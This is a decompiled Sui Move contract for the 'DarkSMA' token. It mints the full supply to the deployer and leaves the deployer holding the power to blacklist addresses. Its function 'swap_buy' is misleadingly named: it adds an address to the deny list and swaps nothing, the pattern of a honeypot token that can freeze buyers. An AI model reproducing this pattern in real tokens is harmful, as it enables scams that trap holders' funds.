module 0x9a9430b3fa74c483dd2c855d3a415657c3b92d9940a501f0d44a90b606b46ad7::darksma {
    struct DARKSMA has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: DARKSMA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DARKSMA>(arg0, 9, b"DarkSMA", b"Dark SMA", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmV7sTGkx5DJAvuabJWczaTFqbZzvxhRvXhKJrLcCiHUw9"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<DARKSMA>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DARKSMA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<DARKSMA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DARKSMA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DARKSMA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DARKSMA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

